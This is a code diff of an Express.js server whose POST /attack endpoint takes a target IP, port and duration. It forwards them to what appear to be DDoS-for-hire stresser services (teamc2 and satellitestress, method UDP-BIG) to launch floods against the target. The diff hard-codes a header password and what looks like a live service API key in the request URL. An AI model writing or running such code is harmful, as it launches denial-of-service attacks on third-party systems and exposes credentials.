@@ -20,8 +20,6 @@ app.use(express.json());
 // ================= ENV =================
 const API_KEY = process.env.API_KEY;
 const PORT = process.env.PORT;
-
-// 🔥 MODE SWITCH
 const MODE = process.env.MODE || "teamc2";
 
 console.log("MODE:", MODE);
@@ -35,7 +33,7 @@ app.post("/attack", async (req, res) => {
   try {
     console.log("➡️ Incoming request");
 
-    // 🔐 basic security (ye rehne de)
+    // 🔐 basic security
     if (req.headers["x-sec"] !== "9xK3pL") {
       return res.status(403).json({ error: "Forbidden" });
     }
@@ -53,10 +51,9 @@ app.post("/attack", async (req, res) => {
       return res.status(400).json({ error: "Invalid port/time" });
     }
 
-    // ================= 🔥 SWITCH =================
+    let responseData;
 
-    let response;
-
+    // ================= 🔥 TEAMC2 (HTTP/1.1) =================
     if (MODE === "teamc2") {
       if (!API_KEY) {
         return res.status(500).json({ error: "API key missing" });
@@ -64,42 +61,47 @@ app.post("/attack", async (req, res) => {
 
       const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
 
-      console.log("🌐 TEAMC2 CALL");
+      console.log("🌐 TEAMC2 (HTTP/1.1)");
 
-      response = await axios.get(url, { timeout: 10000 });
+      const resHttp1 = await axios.get(url, {
+        timeout: 10000
+      });
 
-    } else if (MODE === "cat") {
-      console.log("🌐 CAT API CALL");
+      console.log("📦 TEAMC2 RAW:", resHttp1.data);
 
-      response = await axios.post(
-        "https://api-cat-ecru.vercel.app/",
-        {
-          ip,
-          port,
-          time
-        },
-        {
-          headers: {
-            "Content-Type": "application/json"
-          },
-          timeout: 10000
-        }
-      );
+      responseData = resHttp1.data;
+    }
 
-    } else {
+    // ================= 🔥 CAT (HTTP/1.1) =================
+    else if (MODE === "cat") {
+      console.log("🌐 CAT (HTTP/1.1)");
+
+      const url = `https://satellitestress.st/api/v1/attack/start?key=sk_live_2003892d0f07f1bf1dae6fcef33678b73d0fdac68dcf0f3e71f1873de9b2a705&host=${ip}&port=${port}&time=${time}&method=UDP-BIG`;
+
+      const resHttp1 = await axios.get(url, {
+        timeout: 10000
+      });
+
+      console.log("📦 CAT RAW:", resHttp1.data);
+
+      responseData = resHttp1.data;
+    }
+
+    else {
       return res.status(400).json({ error: "Invalid mode" });
     }
 
     return res.json({
       success: true,
-      data: response.data
+      data: responseData
     });
 
   } catch (err) {
-    console.error("🔥 ERROR:", err?.response?.data || err.message);
+    console.error("🔥 ERROR:", err.message || err);
 
-    return res.status(500).json({
-      error: err?.response?.data || "Server error"
+    return res.status(err?.response?.status || 500).json({
+      success: false,
+      error: err?.response?.data || err.message
     });
   }
 });
